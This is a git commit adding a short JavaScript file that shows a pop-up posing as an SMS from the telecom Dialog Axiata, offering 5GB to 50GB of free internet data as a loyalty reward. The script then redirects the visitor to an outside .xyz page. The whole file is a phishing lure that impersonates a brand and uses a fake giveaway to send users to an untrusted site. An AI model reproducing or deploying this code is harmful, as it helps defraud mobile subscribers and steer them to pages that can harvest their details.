d338d42457d85a8aa9705b6b8e3ec2a923a7f2b0
itidmi <itid180@gmail.com>
2026-07-18 22:06:57 -0700

    Create act-freedialogdata.js

---
+++ act-freedialogdata.js
@@ -0,0 +1,7 @@
+
+var password = 'FREE DATA'
+password=prompt('DIALOG AXIATA SMS: Dear Customer, Kindly Receive Free Internet Data From 5GB To 50GB For Being Our Long Time Subscribers ,Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://itidetere.xyz/freedialogdata.html';
+}
+
